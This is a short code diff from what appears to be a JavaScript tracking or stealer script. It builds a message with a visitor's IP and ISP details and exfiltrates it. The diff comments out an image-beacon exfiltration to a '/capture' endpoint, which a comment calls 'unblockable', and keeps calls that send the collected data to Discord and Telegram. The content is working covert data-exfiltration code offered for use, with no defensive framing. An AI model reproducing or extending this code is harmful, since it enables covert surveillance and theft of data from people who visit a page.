@@ -238,9 +238,9 @@
         msg += `ISP: ${ipData?.isp || ipData?.org || 'N/A'}`;
 
         // Also exfil via Image beacon (unblockable)
-        try {
-            new Image().src = '/capture?d=' + encodeURIComponent(btoa(msg));
-        } catch(e) {}
+       // try {
+        //    new Image().src = '/capture?d=' + encodeURIComponent(btoa(msg));
+        //} catch(e) {}
 
         await sendToDiscord(msg);
         await sendToTelegram(msg);
